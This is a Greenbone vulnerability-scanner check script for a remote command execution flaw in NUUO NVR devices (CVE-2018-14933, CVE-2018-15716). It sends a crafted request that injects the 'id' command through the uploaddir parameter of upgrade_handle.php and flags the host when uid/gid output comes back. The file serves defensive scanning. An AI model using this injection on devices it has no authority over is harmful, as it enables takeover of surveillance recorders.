# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nuuo:nuuo";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141350");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2018-08-06 11:54:43 +0700 (Mon, 06 Aug 2018)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2018-14933", "CVE-2018-15716");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("NUUO NVR RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_nuuo_devices_web_detect.nasl");
  script_mandatory_keys("nuuo/web/detected");

  script_tag(name:"summary", value:"upgrade_handle.php on NUUO NVR allows remote command execution
  (RCE).");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"solution", value:"Upgrade to version 3.10.0 or later.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/45070/");
  script_xref(name:"URL", value:"https://www.nuuo.com/NewsDetail.php?id=0425");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = '/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27';

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = 'It was possible to execute the "id" command.\n\nResult:\n' +
           egrep(pattern: 'uid=[0-9]+.*gid=[0-9]+', string: res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
